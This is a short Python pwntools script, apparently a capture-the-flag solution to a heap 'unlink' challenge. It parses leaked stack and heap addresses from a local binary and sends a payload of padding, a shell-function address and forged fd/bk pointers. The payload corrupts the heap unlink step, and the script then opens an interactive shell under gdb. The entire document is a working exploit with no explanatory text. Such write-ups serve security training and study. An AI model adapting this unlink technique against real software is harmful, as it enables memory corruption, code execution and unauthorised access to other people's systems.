from pwn import *

p = process("./unlink")
context.log_level="debug"
addr_shell = 0x80484EB

p.recvuntil("here is stack address leak: ",drop=True)
addr_stack=int(p.recvuntil("\n",drop=True),16)

p.recvuntil("here is heap address leak: ",drop=True)
addr_heap=int(p.recvuntil("\n",drop=True),16)

payload="a"*12
payload+=p32(addr_shell)
payload+=p32(addr_stack-0x18-0x8)    #fd
payload+=p32(addr_heap+0x4)          #bk

gdb.attach(p, "b unlink")

p.sendline(payload)

p.interactive()
